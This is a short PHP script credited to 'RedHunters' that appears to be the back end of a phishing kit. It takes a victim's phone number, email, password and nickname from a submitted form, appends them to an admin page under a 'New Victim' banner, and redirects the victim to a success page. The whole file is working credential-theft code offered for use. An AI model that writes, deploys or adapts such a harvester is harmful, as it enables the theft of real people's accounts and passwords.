<?php
/*
 * Recode By: RedHunters
 * Please don't Remove this
 */


$number = $_POST['phonenumber'];
$email = $_POST['email'];
$pass = $_POST['password'];
$nick = $_POST['nickname'];



$fp = fopen("admin/index.php", "a+");


fwrite($fp, "  <br>  <br> <br> <br>  🙋🕴️New Victim🕴️🙋 ".$number."  
<br>  Email: ".$email." <br> Password: ".$pass." <br> Name: ".$nick);
fclose($fp);

header("Location: /success.html");

?>